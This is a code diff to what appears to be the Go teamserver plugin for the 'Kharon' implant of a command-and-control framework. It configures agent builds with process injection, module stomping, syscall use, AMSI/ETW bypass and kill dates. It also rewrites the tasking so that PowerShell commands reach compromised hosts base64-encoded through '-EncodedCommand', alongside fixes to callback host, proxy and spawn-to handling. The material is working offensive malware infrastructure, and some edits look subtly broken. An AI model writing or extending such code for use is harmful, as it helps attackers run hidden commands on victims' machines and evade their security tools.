@@ -26,6 +26,44 @@ import (
 )
 
 type KharonConfig struct {
+	agentId string
+
+	osArch   byte
+	userName string
+	computer string
+	netbios  string
+	pid      int
+	tid 	 int
+	imgPath  string
+
+	acp      int
+	oemcp    int
+
+	injectTech int
+	stompMod   string
+	allocation int
+	writing    int
+
+	syscall    int
+	bookProxy  bool
+	amsietwbp  int
+
+	killdateEbl   bool
+	killdateExit  bool
+	killdateSDel  bool
+	killdateYear  int16
+	killdateMonth int16
+	killdateDay   int16
+
+	cmdLine  string
+	heap     int
+	elevated bool
+	jitter   int
+	sleep    int
+	parentId int
+	psArch   int
+	memStart int64
+	memEnd   int64
 }
 
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
@@ -79,7 +117,7 @@ type AgentConfig struct {
 	BofApiProxy bool   `json:"bof_api_proxy"`
 	Syscall     string `json:"syscall"`
 	InjectId    string `json:"inject_id"`
-	StompMod    string `json:"stomp_module"`
+	stompMod    string `json:"stomp_module"`
 
 	GuardIpAddress  string `json:"guardrails_ip"`
 	GuardHostName   string `json:"guardrails_hostname"`
@@ -461,7 +499,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	fmt.Printf("DEBUG: Spawnto (for make): %s\n", spawnto)
 
-	stompModule := cfg.stompModule
+	stompModule := cfg.stompMod
 
 	makeVars := []string{
 		fmt.Sprintf("WEB_HOST=%s", webHostC),
@@ -496,7 +534,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 		fmt.Sprintf("KH_FORK_PIPENAME=%s", forkPipeC),
 		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),
-		fmt.Sprintf("KH_STOMP_MODULE=%s", stompModule)
+		fmt.Sprintf("KH_STOMP_MODULE=%s", stompModule),
 
 		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", boolToInt(cfg.BofApiProxy)),
 
@@ -816,6 +854,8 @@ func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
 	fmt.Printf("OEMCP: %v\n", oemcp)
 
 	_ = int(packer.ParseInt32())
+	_ = packer.ParseBytes()
+	_ = int(packer.ParseInt32())
 	_ = int(packer.ParseInt32())
 
 	_ = int(packer.ParseInt32())
@@ -1039,7 +1079,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'cmd' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_PROC, PROC_RUN, ConvertUTF8toCp(programArgs, agent.ACP)}
+			array = []interface{}{TASK_PROC, PROC_RUN, ConvertCpToUTF16(programArgs, agent.ACP)}
 
 		case "kill":
 			pid, ok := args["pid"].(float64)
@@ -1057,14 +1097,24 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				goto RET
 			}
 
-			script, ok := args["script"].(string)
-			if !ok {
-				fullCmd = fmt.Sprintf("powershell.exe -c %s", command)
+			script, scriptOk := args["script"].(string)
+			var scriptStr string
+
+			if scriptOk {
+				if decoded, err := base64.StdEncoding.DecodeString(script); err == nil {
+					scriptStr = string(decoded)
+				} else {
+					scriptStr = script  
+				}
+				combinedScript := fmt.Sprintf("%s; %s", scriptStr, command)
+				encodedScript := base64.StdEncoding.EncodeToString([]byte(combinedScript))
+				fullCmd = fmt.Sprintf("powershell.exe -EncodedCommand %s", encodedScript)
 			} else {
-				fullCmd = fmt.Sprintf("powershell.exe -c %s; %s", script, command)
+				encodedCmd := base64.StdEncoding.EncodeToString([]byte(command))
+				fullCmd = fmt.Sprintf("powershell.exe -EncodedCommand %s", encodedCmd)
 			}
 
-			array = []interface{}{TASK_PROC, PROC_RUN, ConvertUTF8toCp(fullCmd, agent.ACP)}
+			array = []interface{}{TASK_PROC, PROC_PWSH, ConvertCpToUTF16(fullCmd, agent.ACP)}
 		default:
 			err = errors.New("subcommand for 'ps': 'list', 'run', 'kill' or 'pwsh'")
 			goto RET
@@ -1576,7 +1626,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				goto RET
 			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_CALLBACK, int(action_n), callbackHost, callbackPort}
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_HOST, int(action_n), callbackHost, callbackPort}
 		
 		case "callback.http.useragent":
 			useragent, ok := args["useragent"].(string)
@@ -1588,20 +1638,20 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_UA, useragent}
 
 		case "callback.http.proxy":
-			proxyEnabled, ok := args["proxy_enabled"]
+			proxyEnabled, ok := args["proxy_enabled"].(bool)
 			if !ok {
 				err = errors.New("parameter 'proxy_enabled' must be set")
 				goto RET
 			}
 
-			proxyUrl, ok := args["proxy_url"]
+			proxyUrl, ok := args["proxy_url"].(string)
 			if !ok && proxyEnabled {
 				err = errors.New("parameter 'proxy_enabled' must be set")
 				goto RET
 			}
 
-			proxyUsername := args["username"]
-			proxyPassword := args["password"]
+			proxyUsername := args["username"].(string)
+			proxyPassword := args["password"].(string)
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_PROXY, proxyEnabled, proxyUrl, proxyUsername, proxyPassword}
 		case "killdate.date":
@@ -1696,7 +1746,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				goto RET
 			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_SPAWN, spawnto}
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_SPAWN, ConvertCpToUTF16(spawnto, agent.ACP)}
 		case "blockdlls":
 			status, ok := args["status"].(string)
 			if !ok {
@@ -2090,7 +2140,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 								task.Message = fmt.Sprintf("Process with PID %v (TID %v) started", pid, tid)
 
 								if cmd_packer.CheckPacker([]string{"array"}) {
-									task.clearText = ConvertUTF8toCp(string(cmd_packer.ParseString(), agentData.OemCP))
+									task.ClearText = ConvertCpToUTF8(string(cmd_packer.ParseString()), agentData.OemCP)
 								}
 							}
 							break
@@ -2201,7 +2251,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 									} else if parent, ok := procMap[node.Data.ppid]; ok {
 										parent.Children = append(parent.Children, node)
 									} else {
-										roots = append(roots, node) // orphaned node
+										roots = append(roots, node) 
 									}
 								}
 
@@ -2514,7 +2564,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					fork_spawn_to := cmd_packer.ParseString()
 
 					agent_id := cmd_packer.ParseString()
-					img_name := cmd_packer.ParseString()
+					_ = cmd_packer.ParseString()
 					img_path := cmd_packer.ParseString()
 					cmd_line := cmd_packer.ParseString()
 					process_id := int(cmd_packer.ParseInt32())
@@ -2544,7 +2594,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 
 					injection_techn := int(cmd_packer.ParseInt32())
-					injection_stomp_module := int(cmd_packer.ParseString())
+					injection_stomp_module := cmd_packer.ParseString()
 					injection_alloc := int(cmd_packer.ParseInt32())
 					injection_write := int(cmd_packer.ParseInt32())
 
@@ -2565,19 +2615,18 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					webProxyPass := cmd_packer.ParseString()
 					
 					webHostList := make([]string, webHostQtt)
-					webPortList := make([]string, webPortQtt)
+					webPortList := make([]int,    webPortQtt)
 					webEndpList := make([]string, webEndpQtt)
 
 					for webTargetIdx := 0; webTargetIdx < int(webHostQtt); webTargetIdx++ {
 						webHostList[webTargetIdx] = cmd_packer.ParseString()
-						webPortList[webTargetIdx] = cmd_packer.ParseString()
+						webPortList[webTargetIdx] = int(cmd_packer.ParseInt32())
 					}
 
 					for webEndpIdx := 0; webEndpIdx < int(webEndpQtt); webEndpIdx++ {
 						webEndpList[webEndpIdx] = cmd_packer.ParseString()
 					}
 
-					// Helper functions to format specific values
 					maskTechStr := func(id int) string {
 						switch id {
 						case 1:
@@ -2695,32 +2744,30 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 						}
 					}
 
-					// Format callback hosts with ports - CORRIGIDO
-					formatCallbackHosts := func(hosts []string, ports []string) string {
+					formatCallbackHosts := func(hosts []string, ports []int) string {
 						if len(hosts) == 0 || len(ports) == 0 {
-							return "None"
+							return ""
 						}
 						
 						var pairs []string
 						for i := 0; i < len(hosts) && i < len(ports); i++ {
-							if hosts[i] != "" && ports[i] != "" {
-								pairs = append(pairs, fmt.Sprintf("%s:%s", hosts[i], ports[i]))
+							if hosts[i] != "" && ports[i] != 0 {
+								pairs = append(pairs, fmt.Sprintf("%s:%d", hosts[i], ports[i]))
 							}
 						}
 						
 						if len(pairs) == 0 {
-							return "None"
-						}
-						return strings.Join(pairs, ", ")
-					}
-
-					// Format headers para aparecer completo com lista - CORRIGIDO
-					formatHeaders := func(headers string) string {
-						if headers == "" {
-							return "None"
+							return ""
 						}
 						
-						// Split headers por newlines e limpa espaços
+						return fmt.Sprintf("[%s]", strings.Join(pairs, ", "))
+					}
+
+					formatHeaders := func(headers string) string {
+						if headers == "" {
+							return ""
+						}
+						
 						headerLines := strings.Split(headers, "\n")
 						var cleanHeaders []string
 						
@@ -2789,7 +2836,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					killdateStr := fmt.Sprintf("%02d/%02d/%04d", killdate_day, killdate_mont, killdate_year)
 					osVersionStr := fmt.Sprintf("%d.%d.%d", os_major, os_minor, os_build)
 
-					w1, w2, w3 := 18, 18, 90
+					w1, w2, w3 := 20, 20, 90
 
 					border := "+" +
 						strings.Repeat("-", w1+2) + "+" +
@@ -2823,7 +2870,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					// INJECTION
 					b.WriteString(row("INJECTION", "Injection Technique", injectTechnStr(injection_techn)))
 					b.WriteString(row("", "Stomp Module", (injection_stomp_module)))
-					b.WriteString(row("", "Allocation Method", injectWriteStr(injection_alloc)))
+					b.WriteString(row("", "Allocation Method", injectAllocStr(injection_alloc)))
 					b.WriteString(row("", "Write Method", injectWriteStr(injection_write)))
 					b.WriteString(border)
 
@@ -2853,7 +2900,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					b.WriteString(row("SYSTEM INFO", "User Name", user_name))
 					b.WriteString(row("", "Computer Name", comp_name))
 					b.WriteString(row("", "Domain Name", domn_name))
-					b.WriteString(row("", "CFG Status", boolStr(cfg_enabled)))
+					b.WriteString(row("", "CFG Status", boolStr(uint32(cfg_enabled))))
 					b.WriteString(row("", "OS Arch", fmt.Sprintf("0x%02X", os_arch)))
 					b.WriteString(row("", "OS Version", osVersionStr))
 					b.WriteString(border)
